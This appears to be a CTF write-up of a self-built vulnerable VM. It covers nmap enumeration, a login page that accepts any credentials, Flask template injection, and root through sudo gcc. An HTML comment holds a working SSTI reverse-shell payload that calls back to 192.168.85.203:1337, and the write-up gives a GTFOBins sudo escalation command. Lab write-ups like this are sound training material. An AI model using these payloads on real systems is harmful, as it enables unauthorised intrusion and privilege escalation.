---

title: Writeup for Twenty22

date: 2022-01-20 07:39:05 +0200

categories: [Build vulnerable VMs,Writeup for Twenty22]

tags: vagrant VMs FirstVM writeup

---

### Nmap

```js
PS E:\> nmap -sC -sV 10.10.10.101
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-20 07:03 India Standard Time
Nmap scan report for 10.10.10.101
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:5a:7c:82:c0:2e:e1:c9:57:b5:7d:66:04:e9:31:0e (RSA)
|   256 02:90:6e:33:7a:b2:53:83:a6:0f:2f:16:93:94:a1:96 (ECDSA)
|_  256 cf:8b:32:62:3d:22:79:8b:2b:f0:9f:f0:94:87:24:dd (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Twenty22 | Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:C3:C3:3D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```
- There're two ports opened, 22 has ssh and 80 has an apache webserver
- Let's visit the web page

### Website
![login-page](https://i.imgur.com/sPx1JbN.png)
- Here's a login page, but we don't have any credentials
- Let's try with `admin:admin`

![welcome-admin](https://i.imgur.com/4QPXx0u.png)
- It worked, let's try with other credentials, for example `test:test` 

![test-test](https://i.imgur.com/GaMTlpo.png)
- I think there's no login check, it simply logs us in with any credentials
- And our username is reflecting here `[ Welcome test, It's late the CTF has ended ]`
- Let's enum other pages

### CTF site
- This is a mini CTF site
- Sadly the CTF has ended
- There are two web challenges, which still active
- But it's not hosted inside this machine, Its publicly hosted so we can't make use of that challenges
- There's a scoreboard and users pages
- This page uses a cookie `user:test`
- Our username will be stored there
- Nothing interesting than our reflected input and cookies

![static](https://i.imgur.com/tDGnVnP.png)
- By viewing the source there's a folder name `static`
- So let's try for **SSTI** 

#### SSTI
- I used ![7*7](https://i.imgur.com/b8rE1NY.png) as my username

![ssti](https://i.imgur.com/vDKsJQA.png)

- It works :D
- So this is a flask app has SSTI
- Let's try to get a reverse shell

![rev-payload](https://i.imgur.com/oO8kGam.png)
<!--{{config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.85.203/1337 0>&1"').read()}} -->

![shell as www-data](https://i.imgur.com/2t8obfL.png)
- Cool we got shell :D

### User part
![credentials-pwn](https://i.imgur.com/elLKb0X.png)
- We can't see user.txt but we got credetials for pwn user
- There's a todo.txt in `/home/pwn` and a password is there
- Let's try this to login as `pwn`

![user.txt](https://i.imgur.com/NkC2IZ6.png)
- Nice we got user
- Let's upgrade our shell

### Root part
![sudo -l](https://i.imgur.com/ce66c7y.png)
- By running `sudo -l` we can see that `pwn` user can run `/usr/bin/gcc` with sudo

![gtfobins](https://i.imgur.com/SkM5TJg.png)
- Quickly I searched in gtfobins and it has gcc

![sudo gcc](https://i.imgur.com/PkdeFP1.png)
- Let's run this command 

`sudo gcc -wrapper /bin/sh,-s .`

![rooted](https://i.imgur.com/eFP7fHl.png)
- Cool we rooted :D
- That's all guys, I hope you liked this box <3 
- See my previous post [How to create vulnerable VM](https://jopraveen.me/posts/create-vulnerable-vm/)
